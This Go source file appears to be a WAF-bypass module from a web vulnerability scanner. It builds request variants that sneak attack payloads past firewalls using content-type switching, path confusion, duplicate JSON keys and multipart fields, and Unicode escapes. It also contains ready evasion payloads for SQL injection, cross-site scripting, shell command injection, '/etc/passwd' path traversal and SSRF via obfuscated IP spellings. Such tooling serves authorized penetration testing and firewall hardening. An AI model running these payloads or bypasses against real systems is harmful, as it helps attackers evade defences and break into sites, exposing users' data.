// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash

package wafbypass

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"mime/multipart"
	"net"
	"net/url"
	"regexp"
	"sort"
	"strconv"
	"strings"
)

// MaxAttemptsForPlugin is the total variant ceiling, including the generic
// header/HPP/encoding attempts and the modern parser-discrepancy slots.
// Aggressive-only and still bounded by the scan request budget.
const MaxAttemptsForPlugin = 28

var (
	xssCallRe   = regexp.MustCompile(`(?i)[A-Za-z_$][A-Za-z0-9_$]*\s*\([^)]*\)`)
	xssScriptRe = regexp.MustCompile(`(?is)<script[^>]*>.*?</script>`)
	xssAlertRe  = regexp.MustCompile(`(?i)alert\(([^)]*)\)`)
)

// BuildAttemptsForPlugin extends the generic attempts with semantic payload
// variants for the plugin's vulnerability class.
func BuildAttemptsForPlugin(rawURL string, headers map[string]string, body []byte, pluginID string) []Attempt {
	attempts := BuildAttempts(rawURL, headers, body)
	class, mutate := classMutator(pluginID)
	if mutate == nil || len(attempts) >= MaxAttemptsForPlugin {
		return attempts
	}
	baseHeaders := cloneStrMap(headers)
	for k, v := range BypassHeaders() {
		if !hasHeaderKey(baseHeaders, k) {
			baseHeaders[k] = v
		}
	}
	ct := ""
	for k, v := range headers {
		if strings.EqualFold(k, "Content-Type") {
			ct = strings.ToLower(v)
			break
		}
	}
	isJSON := strings.Contains(ct, "json") || json.Valid(body)
	var semantic []Attempt
	if q := queryAttempts(rawURL, baseHeaders, body, class, mutate); len(q) > 0 {
		semantic = append(semantic, q...)
	}
	switch {
	case isJSON:
		semantic = append(semantic, jsonParserDifferentials(rawURL, baseHeaders, body)...)
		semantic = append(semantic, jsonAttempts(rawURL, baseHeaders, body, class, mutate)...)
	case len(body) > 0:
		semantic = append(semantic, formAttempts(rawURL, baseHeaders, body, class, mutate)...)
	}
	// Parser-differential variants get reserved slots: a semantic flood must
	// not hide content-type, path, HPP, multipart, or padding tactics.
	var extra []Attempt
	contentTypes := contentTypeAttempts(rawURL, baseHeaders, body, isJSON)
	if len(contentTypes) > 5 {
		contentTypes = contentTypes[:5]
	}
	extra = append(extra, contentTypes...)
	paths := pathConfusionAttempts(rawURL, baseHeaders, body)
	if len(paths) > 4 {
		paths = paths[:4]
	}
	extra = append(extra, paths...)
	if hpp := hppDifferentialAttempts(rawURL, baseHeaders, body); len(hpp) > 0 {
		extra = append(extra, hpp...)
	}
	if mp := multipartModernAttempts(rawURL, baseHeaders, body); len(mp) > 0 {
		extra = append(extra, mp...)
	}
	if hdr := headerValueAttempts(rawURL, baseHeaders, body, class, mutate); len(hdr) > 0 {
		extra = append(extra, hdr...)
	}
	if gz := gzipAttempt(rawURL, baseHeaders, body); len(gz) > 0 {
		extra = append(extra, gz...)
	}
	if ck := cookieVersionAttempt(rawURL, baseHeaders, body); len(ck) > 0 {
		extra = append(extra, ck...)
	}
	if pad := paddingAttempt(rawURL, baseHeaders, body); len(pad) > 0 {
		extra = append(extra, pad...)
	}
	if isJSON {
		if keys := jsonKeyAttempts(rawURL, baseHeaders, body); len(keys) > 0 {
			extra = append(extra, keys...)
		}
	}
	remaining := MaxAttemptsForPlugin - len(attempts) - len(extra)
	if remaining > 0 {
		if len(semantic) > remaining {
			semantic = semantic[:remaining]
		}
		extra = append(extra, semantic...)
	}
	return append(attempts, extra...)
}

// contentTypeAttempts sends the same payload under a different content type.
// What: JSON under text/plain/vendor types; form under multipart.
// Why: WAF parsers key on Content-Type; a backend that still parses the body
// can receive the payload while the WAF rule path is skipped.
func contentTypeAttempts(rawURL string, headers map[string]string, body []byte, isJSON bool) []Attempt {
	var out []Attempt
	if isJSON {
		for _, alt := range []string{
			"application/json; charset=utf-8",
			"text/plain",
			"application/x-www-form-urlencoded",
			"application/vnd.api+json",
		} {
			h := cloneStrMap(headers)
			h["Content-Type"] = alt
			out = append(out, Attempt{
				Name:    "content-type-" + sanitizeTechnique(alt),
				URL:     rawURL,
				Headers: h,
				Body:    body,
			})
		}
		// No Content-Type: some WAFs stop parsing a body they cannot classify,
		// while a JSON backend may still accept it.
		h := cloneStrMap(headers)
		deleteHeader(h, "Content-Type")
		out = append(out, Attempt{
			Name:    "content-type-absent",
			URL:     rawURL,
			Headers: h,
			Body:    body,
		})
		return out
	}
	vals, err := url.ParseQuery(string(body))
	if err != nil || len(vals) == 0 {
		return nil
	}
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	for _, k := range sortedKeys(vals) {
		for _, v := range vals[k] {
			_ = w.WriteField(k, v)
		}
	}
	_ = w.Close()
	h := cloneStrMap(headers)
	h["Content-Type"] = w.FormDataContentType()
	out = append(out, Attempt{
		Name:    "content-type-multipart",
		URL:     rawURL,
		Headers: h,
		Body:    buf.Bytes(),
	})
	// Multipart parser differential: duplicate the target field with a benign
	// first value; a first-wins WAF and a last-wins backend disagree.
	for _, key := range sortedKeys(vals) {
		if len(out) >= 4 {
			break
		}
		var dup bytes.Buffer
		dw := multipart.NewWriter(&dup)
		for _, k := range sortedKeys(vals) {
			if k == key {
				_ = dw.WriteField(k, "gash-waf-benign")
			}
			for _, v := range vals[k] {
				_ = dw.WriteField(k, v)
			}
		}
		_ = dw.Close()
		dh := cloneStrMap(headers)
		dh["Content-Type"] = dw.FormDataContentType()
		out = append(out, Attempt{
			Name:    "multipart-duplicate-" + sanitizeTechnique(key),
			URL:     rawURL,
			Headers: dh,
			Body:    dup.Bytes(),
		})
	}
	return out
}

// pathConfusionAttempts varies the path spelling (double slash, dot segment,
// semicolon) so path-normalizing WAF rules and app routers can disagree.
func pathConfusionAttempts(rawURL string, headers map[string]string, body []byte) []Attempt {
	u, err := url.Parse(rawURL)
	if err != nil || u.Path == "" || u.Path == "/" {
		return nil
	}
	variants := []string{
		u.Path + "//",
		u.Path + "/.",
		strings.Replace(u.Path, "/", "//", 1),
		u.Path + "/..;/",
		u.Path + "/./",
		u.Path + ";",
	}
	var out []Attempt
	seen := map[string]bool{}
	for i, p := range variants {
		clone := *u
		clone.Path = p
		if seen[clone.String()] {
			continue
		}
		seen[clone.String()] = true
		out = append(out, Attempt{
			Name:    fmt.Sprintf("path-confusion-%d", i),
			URL:     clone.String(),
			Headers: cloneStrMap(headers),
			Body:    body,
		})
		if len(out) == 4 {
			break
		}
	}
	return out
}

func sanitizeTechnique(s string) string {
	r := strings.NewReplacer("/", "-", ";", "", " ", "")
	return r.Replace(s)
}

func classMutator(pluginID string) (string, func(string) []string) {
	id := strings.ToLower(strings.TrimSpace(pluginID))
	switch {
	case strings.Contains(id, "sqli"):
		return "sqli", sqlVariants
	case strings.Contains(id, "xss") || strings.Contains(id, "dom-"):
		return "xss", xssVariants
	case strings.Contains(id, "command") || strings.Contains(id, "log4shell"):
		return "cmd", cmdVariants
	case strings.Contains(id, "path") || strings.Contains(id, "lfi") || strings.Contains(id, "traversal") || strings.Contains(id, "rfi"):
		return "path", pathVariants
	case strings.Contains(id, "ssrf") || strings.Contains(id, "redirect"):
		return "url", urlVariants
	case strings.Contains(id, "ssti") || strings.Contains(id, "template") || strings.Contains(id, "expression"):
		return "generic", genericVariants
	default:
		return "generic", genericVariants
	}
}

func queryAttempts(rawURL string, headers map[string]string, body []byte, class string, mutate func(string) []string) []Attempt {
	u, err := url.Parse(rawURL)
	if err != nil || u.RawQuery == "" {
		return nil
	}
	vals, err := url.ParseQuery(u.RawQuery)
	if err != nil {
		return nil
	}
	var out []Attempt
	seen := map[string]bool{}
	for _, key := range sortedKeys(vals) {
		for _, value := range vals[key] {
			for i, variant := range mutate(value) {
				if variant == "" || variant == value {
					continue
				}
				clone := make(url.Values, len(vals))
				for k, vs := range vals {
					clone[k] = append([]string{}, vs...)
				}
				for j, v := range clone[key] {
					if v == value {
						clone[key][j] = variant
						break
					}
				}
				nu := *u
				nu.RawQuery = clone.Encode()
				keyID := nu.String() + "|" + string(body)
				if seen[keyID] {
					continue
				}
				seen[keyID] = true
				out = append(out, Attempt{
					Name:    fmt.Sprintf("%s-%s-%d", class, key, i),
					URL:     nu.String(),
					Headers: cloneStrMap(headers),
					Body:    body,
				})
			}
		}
	}
	return out
}

func formAttempts(rawURL string, headers map[string]string, body []byte, class string, mutate func(string) []string) []Attempt {
	vals, err := url.ParseQuery(string(body))
	if err != nil || len(vals) == 0 {
		return nil
	}
	var out []Attempt
	seen := map[string]bool{}
	for _, key := range sortedKeys(vals) {
		for _, value := range vals[key] {
			for i, variant := range mutate(value) {
				if variant == "" || variant == value {
					continue
				}
				clone := make(url.Values, len(vals))
				for k, vs := range vals {
					clone[k] = append([]string{}, vs...)
				}
				for j, v := range clone[key] {
					if v == value {
						clone[key][j] = variant
						break
					}
				}
				enc := clone.Encode()
				if seen[enc] {
					continue
				}
				seen[enc] = true
				h := cloneStrMap(headers)
				h["Content-Type"] = "application/x-www-form-urlencoded"
				out = append(out, Attempt{
					Name:    fmt.Sprintf("%s-%s-%d", class, key, i),
					URL:     rawURL,
					Headers: h,
					Body:    []byte(enc),
				})
			}
		}
	}
	return out
}

func jsonAttempts(rawURL string, headers map[string]string, body []byte, class string, mutate func(string) []string) []Attempt {
	var root any
	if err := json.Unmarshal(body, &root); err != nil {
		return nil
	}
	var out []Attempt
	var walk func(node any, path []any) bool
	walk = func(node any, path []any) bool {
		switch n := node.(type) {
		case map[string]any:
			for k, v := range n {
				if walk(v, append(append([]any{}, path...), k)) {
					return true
				}
			}
		case []any:
			for i, v := range n {
				if walk(v, append(append([]any{}, path...), i)) {
					return true
				}
			}
		case string:
			for i, variant := range mutate(n) {
				if variant == "" || variant == n {
					continue
				}
				clone := deepCopyJSON(root)
				if !setJSONPath(clone, path, variant) {
					continue
				}
				encoded, err := json.Marshal(clone)
				if err != nil {
					continue
				}
				h := cloneStrMap(headers)
				h["Content-Type"] = "application/json"
				out = append(out, Attempt{
					Name:    fmt.Sprintf("%s-json-%d", class, i),
					URL:     rawURL,
					Headers: h,
					Body:    encoded,
				})
			}
		}
		return false
	}
	walk(root, nil)
	return out
}

// jsonParserDifferentials exploits WAF/backend JSON parser differences:
// duplicate keys (WAF reads first, backend reads last) and \uXXXX escapes
// (backend decodes, a normalizing WAF may not).
func jsonParserDifferentials(rawURL string, headers map[string]string, body []byte) []Attempt {
	var obj map[string]any
	if err := json.Unmarshal(body, &obj); err != nil || len(obj) == 0 {
		return nil
	}
	keys := make([]string, 0, len(obj))
	for k := range obj {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	var out []Attempt
	for _, key := range keys {
		value, ok := obj[key].(string)
		if !ok || value == "" {
			continue
		}
		h := cloneStrMap(headers)
		h["Content-Type"] = "application/json"
		// Duplicate key: benign first, payload second.
		var dup strings.Builder
		dup.WriteByte('{')
		for i, k := range keys {
			if i > 0 {
				dup.WriteByte(',')
			}
			kb, _ := json.Marshal(k)
			dup.Write(kb)
			dup.WriteByte(':')
			if k == key {
				benign, _ := json.Marshal("gash-waf-benign")
				dup.Write(benign)
				dup.WriteByte(',')
				dup.Write(kb)
				dup.WriteByte(':')
				payload, _ := json.Marshal(value)
				dup.Write(payload)
				continue
			}
			vb, _ := json.Marshal(obj[k])
			dup.Write(vb)
		}
		dup.WriteByte('}')
		out = append(out, Attempt{
			Name:    "json-duplicate-key-" + sanitizeTechnique(key),
			URL:     rawURL,
			Headers: h,
			Body:    []byte(dup.String()),
		})
		if escaped, ok := jsonUnicodeString(value); ok {
			var uni strings.Builder
			uni.WriteByte('{')
			for i, k := range keys {
				if i > 0 {
					uni.WriteByte(',')
				}
				kb, _ := json.Marshal(k)
				uni.Write(kb)
				uni.WriteByte(':')
				if k == key {
					uni.WriteString(escaped)
					continue
				}
				vb, _ := json.Marshal(obj[k])
				uni.Write(vb)
			}
			uni.WriteByte('}')
			out = append(out, Attempt{
				Name:    "json-unicode-" + sanitizeTechnique(key),
				URL:     rawURL,
				Headers: h,
				Body:    []byte(uni.String()),
			})
		}
	}
	return out
}

func jsonUnicodeString(s string) (string, bool) {
	if s == "" {
		return "", false
	}
	var b strings.Builder
	b.WriteByte('"')
	for _, r := range s {
		if r > 0xffff {
			return "", false
		}
		fmt.Fprintf(&b, `\u%04x`, r)
	}
	b.WriteByte('"')
	return b.String(), true
}

func deepCopyJSON(v any) any {
	raw, err := json.Marshal(v)
	if err != nil {
		return v
	}
	var out any
	if err := json.Unmarshal(raw, &out); err != nil {
		return v
	}
	return out
}

func setJSONPath(root any, path []any, value string) bool {
	if len(path) == 0 {
		return false
	}
	switch node := root.(type) {
	case map[string]any:
		key, ok := path[0].(string)
		if !ok {
			return false
		}
		if len(path) == 1 {
			node[key] = value
			return true
		}
		child, ok := node[key]
		if !ok {
			return false
		}
		return setJSONPath(child, path[1:], value)
	case []any:
		idx, ok := path[0].(int)
		if !ok || idx < 0 || idx >= len(node) {
			return false
		}
		if len(path) == 1 {
			node[idx] = value
			return true
		}
		return setJSONPath(node[idx], path[1:], value)
	}
	return false
}

func sqlVariants(v string) []string {
	lower := strings.ToLower(v)
	if !strings.ContainsAny(v, "'\"") &&
		!strings.Contains(lower, "select") && !strings.Contains(lower, "union") &&
		!strings.Contains(lower, " or ") && !strings.Contains(lower, " and ") &&
		!strings.Contains(lower, "sleep") && !strings.Contains(lower, "waitfor") &&
		!strings.Contains(lower, "information_schema") {
		return nil
	}
	var out []string
	if strings.Contains(v, " ") {
		out = append(out,
			strings.ReplaceAll(v, " ", "/**/"),
			strings.ReplaceAll(v, " ", "%09"),
			strings.ReplaceAll(v, " ", "%0a"),
			strings.ReplaceAll(v, " ", "+"),
		)
	}
	replacer := strings.NewReplacer(
		" OR ", " /*!50000OR*/ ", " or ", " /*!50000or*/ ",
		" UNION ", " /*!50000UNION*/ ", " union ", " /*!50000union*/ ",
		" SELECT ", " /*!50000SELECT*/ ", " select ", " /*!50000select*/ ",
	)
	out = append(out, replacer.Replace(v))
	if strings.Contains(v, "'1'") {
		out = append(out,
			strings.ReplaceAll(v, "'1'", "0x31"),
			strings.ReplaceAll(v, "'1'", "CHAR(49)"),
			strings.ReplaceAll(v, "'1'", "CHR(49)"),
		)
	}
	out = append(out, strings.TrimRight(v, " ")+"-- -", strings.TrimRight(v, " ")+"#", mixedCase(v))
	// Symbolic boolean operators are valid in MySQL/MariaDB/SQLite and are
	// frequently missed by rule sets that only match the words OR/AND.
	out = append(out,
		strings.ReplaceAll(v, " OR ", " || "),
		strings.ReplaceAll(v, " or ", " || "),
		strings.ReplaceAll(v, " AND ", " && "),
		strings.ReplaceAll(v, " and ", " && "),
		strings.ReplaceAll(v, "'1'='1", "1=1"),
	)
	// Modern normalization differentials: percent/GBK quote forms and
	// whitespace characters that some WAF tokenizers treat differently from
	// the database parser.
	out = append(out,
		strings.ReplaceAll(v, "'", "%27"),
		strings.ReplaceAll(v, "'", "%bf%27"),
		strings.ReplaceAll(v, "'", `\'`),
		strings.ReplaceAll(v, " ", "%0b"),
		strings.ReplaceAll(v, " ", "%0c"),
		strings.ReplaceAll(v, " ", "%0d"),
		strings.ReplaceAll(v, " ", "%a0"),
	)
	return dedupeStrings(out)
}

func xssVariants(v string) []string {
	lower := strings.ToLower(v)
	if !strings.Contains(lower, "<script") && !strings.Contains(lower, "alert(") &&
		!strings.Contains(lower, "onerror") && !strings.Contains(lower, "onload") &&
		!strings.Contains(lower, "javascript:") {
		return nil
	}
	call := "alert(1)"
	if m := xssCallRe.FindString(v); m != "" {
		call = strings.TrimSpace(m)
	}
	var out []string
	// Prioritize signature-evasion forms before the long tag list so the
	// attempt budget cannot truncate them behind older variants.
	if m := xssAlertRe.FindStringSubmatch(call); len(m) == 2 {
		out = append(out,
			"<svg/onload=alert`"+m[1]+"`>",
			"<svg/onload=top['al'+'ert']("+m[1]+")>",
			"<svg/onload=self['al'+'ert']("+m[1]+")>",
		)
	}
	// A data: URI is often treated as an opaque URL by signature WAFs. The
	// base64 payload still contains the canary once decoded by the browser.
	b64 := base64.StdEncoding.EncodeToString([]byte("<script>" + call + "</script>"))
	out = append(out, "<iframe src=\"data:text/html;base64,"+b64+"\"></iframe>")
	out = append(out,
		"<svg/onload="+call+">",
		"<svg><animate onbegin="+call+">",
		"<svg><set attributeName=x onbegin="+call+">",
		"<svg><a xlink:href=javascript:"+call+">",
		"<img src=x onerror="+call+">",
		"<details open ontoggle="+call+">",
		"<body onload="+call+">",
		"<math><mtext></mtext><img src=x onerror="+call+"></math>",
		"<math><mtext><table><mglyph><style><img src=x onerror="+call+">",
		"<iframe srcdoc=\"<script>"+call+"</script>\">",
		"<input autofocus onfocus="+call+">",
		"<select autofocus onfocus="+call+">",
		"<textarea autofocus onfocus="+call+">",
		"<video><source onerror="+call+">",
		"<audio src=x onerror="+call+">",
		"<marquee onstart="+call+">",
		"<form><button formaction=javascript:"+call+">",
		"<object data=javascript:"+call+"></object>",
		"<embed src=javascript:"+call+">",
	)
	if xssScriptRe.MatchString(v) {
		out = append(out, xssScriptRe.ReplaceAllString(v, "<svg/onload="+call+">"))
	}
	// Entity/Unicode forms execute when the backend decodes them but the WAF
	// does not; the reflection oracle still requires an executable context.
	out = append(out,
		"&#x3C;svg/onload="+call+"&#x3E;",
		"&#60;svg/onload="+call+"&#62;",
		`\u003Csvg/onload=`+call+`\u003E`,
		"%3Csvg/onload="+call+"%3E",
	)
	if strings.Contains(lower, "alert") {
		out = append(out, strings.ReplaceAll(v, "alert", "confirm"), strings.ReplaceAll(v, "alert", "prompt"))
	}
	out = append(out, strings.ReplaceAll(v, "<script>", "<script >"), strings.ReplaceAll(v, "</script>", "</script >"))
	return dedupeStrings(out)
}

func cmdVariants(v string) []string {
	lower := strings.ToLower(v)
	if !strings.ContainsAny(v, ";|&$`") && !strings.Contains(lower, "sleep") && !strings.Contains(lower, "ping") && !strings.Contains(lower, "curl") {
		return nil
	}
	var out []string
	if strings.Contains(v, " ") {
		out = append(out,
			strings.ReplaceAll(v, " ", "${IFS}"),
			strings.ReplaceAll(v, " ", "$IFS"),
			strings.ReplaceAll(v, " ", "%09"),
			strings.ReplaceAll(v, " ", "%0a"),
		)
	}
	out = append(out,
		strings.ReplaceAll(v, ";", "%0a"),
		strings.ReplaceAll(v, ";", "%0d%0a"),
		strings.ReplaceAll(v, ";", "|"),
		strings.ReplaceAll(v, "|", "||"),
		strings.ReplaceAll(v, "&", "&&"),
		v+";",
		v+"&&",
	)
	return dedupeStrings(out)
}

func pathVariants(v string) []string {
	lower := strings.ToLower(v)
	if !strings.Contains(lower, "..") && !strings.Contains(lower, "etc/") && !strings.Contains(lower, "win.ini") {
		return nil
	}
	var out []string
	out = append(out,
		"..%2f..%2f..%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"..%5c..%5c..%5cwindows%5cwin.ini",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"....//....//....//etc/passwd",
		"..%c0%af..%c0%af..%c0%afetc/passwd",
		"..%e0%80%ae..%e0%80%ae..%e0%80%aeetc/passwd",
		"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
		"..;/..;/..;/etc/passwd",
		"..%2f..%2f..%2fetc%2fpasswd%00",
	)
	return dedupeStrings(out)
}

func urlVariants(v string) []string {
	lower := strings.ToLower(v)
	if !strings.HasPrefix(lower, "http://") && !strings.HasPrefix(lower, "https://") && !strings.HasPrefix(v, "//") && !strings.Contains(v, "://") {
		return nil
	}
	host := v
	for _, prefix := range []string{"https://", "http://", "//"} {
		if strings.HasPrefix(lower, prefix) {
			host = v[len(prefix):]
			break
		}
	}
	if i := strings.IndexAny(host, "/?#"); i >= 0 {
		host = host[:i]
	}
	if host == "" {
		return nil
	}
	out := []string{
		"//" + host + "/",
		"/\\" + host + "/",
		"/%5c" + host + "/",
		"/%2f%2f" + host + "/",
		"https://" + host + "@" + host + "/",
	}
	// Numeric/hex/octal/IPv6 spellings of the same IP are resolved by the
	// backend but often missed by URL-prefix rules.
	if ip := net.ParseIP(host); ip != nil {
		var hosts []string
		if v4 := ip.To4(); v4 != nil {
			num := binary.BigEndian.Uint32(v4)
			hosts = append(hosts,
				strconv.FormatUint(uint64(num), 10),
				"0x"+hex.EncodeToString(v4),
				fmt.Sprintf("0%o.0%o.0%o.0%o", v4[0], v4[1], v4[2], v4[3]),
				"0x"+fmt.Sprintf("%02x", v4[0])+"."+fmt.Sprintf("%02x", v4[1])+"."+
					fmt.Sprintf("%02x", v4[2])+"."+fmt.Sprintf("%02x", v4[3]),
			)
			if mapped := net.ParseIP("::ffff:" + ip.String()); mapped != nil {
				// net.IP.String() unmaps v4-mapped addresses; render the
				// canonical hex IPv6 form the backend resolver accepts.
				hosts = append(hosts, fmt.Sprintf("[::ffff:%02x%02x:%02x%02x]",
					v4[0], v4[1], v4[2], v4[3]))
			}
		} else {
			hosts = append(hosts, "["+ip.String()+"]")
		}
		for _, altHost := range hosts {
			if alt := replaceURLHost(v, altHost); alt != "" && alt != v {
				out = append(out, alt)
			}
		}
	}
	return dedupeStrings(out)
}

// replaceURLHost rewrites the payload host while preserving userinfo, port,
// path, and query. The rewritten value is still a payload, not the request
// target; PolicySession scope applies to the request URL, not this value.
func replaceURLHost(raw, newHost string) string {
	u, err := url.Parse(raw)
	if err != nil || u.Host == "" {
		return ""
	}
	if strings.Contains(newHost, ":") && !strings.HasPrefix(newHost, "[") {
		newHost = "[" + newHost + "]"
	}
	if port := u.Port(); port != "" {
		newHost += ":" + port
	}
	u.Host = newHost
	return u.String()
}

func genericVariants(v string) []string {
	if v == "" {
		return nil
	}
	out := []string{
		url.QueryEscape(url.QueryEscape(v)),
		mixedCase(v),
		strings.ReplaceAll(v, " ", "/**/"),
		strings.ReplaceAll(v, " ", "%09"),
	}
	return dedupeStrings(out)
}

func dedupeStrings(in []string) []string {
	seen := map[string]bool{}
	out := make([]string, 0, len(in))
	for _, s := range in {
		if s == "" || seen[s] {
			continue
		}
		seen[s] = true
		out = append(out, s)
	}
	return out
}
